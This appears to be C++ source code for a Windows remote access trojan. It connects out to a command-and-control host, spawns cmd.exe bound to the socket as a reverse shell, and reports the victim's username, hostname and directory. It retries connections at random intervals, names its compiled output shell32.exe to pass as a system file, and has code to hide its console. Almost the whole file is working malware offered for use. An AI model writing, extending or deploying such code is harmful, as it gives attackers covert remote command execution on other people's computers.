// Main headers
#include <winsock2.h>
#include <windows.h>  //Used for WinApi calls
#include <ws2tcpip.h> //TCP-IP Sockets
#include <stdio.h>
#include <time.h>

#include <iostream> //Remove later for space

#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


// to compile:
// i686-w64-mingw32-g++ wsarev.cpp -o shell32.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc

// We can try and use two iterations of this shell. Keep it in an "inactive state" where batch-commands (using Shell), profiling/information-gathering,
// and beaconing is possible. This will preferably use the WINAPI functions (stealthy?). Then, we can implement the 'interaction' part of the shell, 
// in which the cmd.exe process is executes.

// Pseudo-code/outline
/* 
start program:
    start socket, init connection
    listen for incoming data: if cant connect retry in random interval range 5-40 seconds
        if data = shell:
            spawn cmd.exe 
            -> upon exit, close process. 
            -> send message saying process closed (C2 catches message and closes interaction successfully)
        else if data = batch:
            start secondary listener for follow-up data (ie. commands for shell exec, profiling)
            wait for 'quit' message which exits listening 'loop?'
        else if data = exit:
            kill socket
            kill process
            exit(0)
        else if data = info:
            get user, hostname, process name, users logged in, ip address, domain name, etc.
            make pretty
            send home
        
Notes and Questions:
    - How much of this is can be done with the WinAPI?
    - 
*/

//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

// Functions, individual actions, and commands

void whoami(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetUserName(returnval, &bufferlen);
}

void hostname(char *returnval, int returnsize)
{
    DWORD bufferlen = 257;
    GetComputerName(returnval, &bufferlen);
}

void pwd(char *returnval, int returnsize) // Module 2
{
    TCHAR tempvar[MAX_PATH];
    GetCurrentDirectory(MAX_PATH, tempvar);
    strcat(returnval, tempvar);
}

//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

void RAT(char* C2_Server, int C2_Port)
{
    srand(time(0));

    while (true)
    {
        Sleep((rand() % 20) + 5);    // Trys to reconnect every 5-25 seconds

        SOCKET tcp_sock;
        sockaddr_in addr;
        WSADATA wsa_version;


        WSAStartup(MAKEWORD(2,2), &wsa_version);
        tcp_sock = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2_Server);  
        addr.sin_port = htons(C2_Port);

        // Initialize connection
        if (WSAConnect(tcp_sock, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(tcp_sock);
            WSACleanup();
            continue;
        }
        else // Analyze and wait for data upon successful connection
        {
            char CommandReceived[DEFAULT_BUFLEN] = "";
            memset(CommandReceived, 0, sizeof(CommandReceived));

            while (true)
            {
                int result = recv(tcp_sock, CommandReceived, DEFAULT_BUFLEN, 0);

                std::cout << "Command received: " << CommandReceived;
                std::cout << "Length of Command received: " << result << std::endl;

                // Should only be used in individual interactive environments == TBC
                if ((strcmp(CommandReceived, "shell") == 0))
                {
                    char Process[] = "cmd.exe";
                    STARTUPINFO sinfo;
                    PROCESS_INFORMATION pinfo;

                    memset(&sinfo, 0, sizeof(sinfo));
                    sinfo.cb = sizeof(sinfo);
                    sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) tcp_sock;

                    CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);

                    // We are here, hanging in the cmd.exe process until it is closed by a TERM or exit command
                    WaitForSingleObject(pinfo.hProcess, INFINITE); 

                    CloseHandle(pinfo.hProcess);
                    CloseHandle(pinfo.hThread);

                    //memset(CommandReceived, 0, sizeof(CommandReceived));

                    char buffer[64] = "";
                    strcat(buffer,"[* Agent-Msg] Exiting shell\n");
                    send(tcp_sock,buffer,strlen(buffer) + 1, 0);

                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));

                    // int RecvCode = recv(tcp_sock, RecvData, DEFAULT_BUFLEN, 0);

                    // if (RecvCode <= 0) {
                    //     closesocket(mySocket);
                    //     WSACleanup();
                    //     continue;
                    // }
                    // if (strcmp(RecvData, "EXIT\n") == 0) {
                    //     continue;
                    // }
                }
                else if ((strcmp(CommandReceived, "whoami") == 0))
                {
                    char buffer[257] = "";
                    whoami(buffer, 257);
                    strcat(buffer, "\n");
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(CommandReceived, "hostname") == 0))
                {
                    char buffer[257] = "";
                    hostname(buffer, 257);
                    strcat(buffer, "\n");
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(CommandReceived, "pwd") == 0))
                {
                    char buffer[257] = "";
                    pwd(buffer, 257);
                    strcat(buffer, "\n");
                    send(tcp_sock, buffer, strlen(buffer) + 1, 0);
                    memset(buffer, 0, sizeof(buffer));
                    memset(CommandReceived, 0, sizeof(CommandReceived));
                }
                else if ((strcmp(CommandReceived, "exit") == 0))
                {
                    closesocket(tcp_sock);
                    WSACleanup();
                    exit(0);
                }
                // else
                // {

                // }
                
            }
        }
    }
}
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
//# ======================================================================================================================================================================================
//# --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


int main(int argc, char **argv) {

    HWND stealth;                                       //Declare a window handle 
    AllocConsole();                                     //Allocate a new console
    stealth=FindWindowA("ConsoleWindowClass",NULL);     //Find the previous Window handler and hide/show the window depending upon the next command
    ShowWindow(stealth,SW_SHOWNORMAL);                  //SW_SHOWNORMAL = 1 = show, SW_HIDE = 0 = Hide the console

    // FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); 
        RAT(argv[1], port);
    }
    else {
        char host[] = "192.168.75.100";     // change this to your ip address
        int port = 1337;                    // change this to your open port
        RAT(host, port);
    }
    return 0;
}
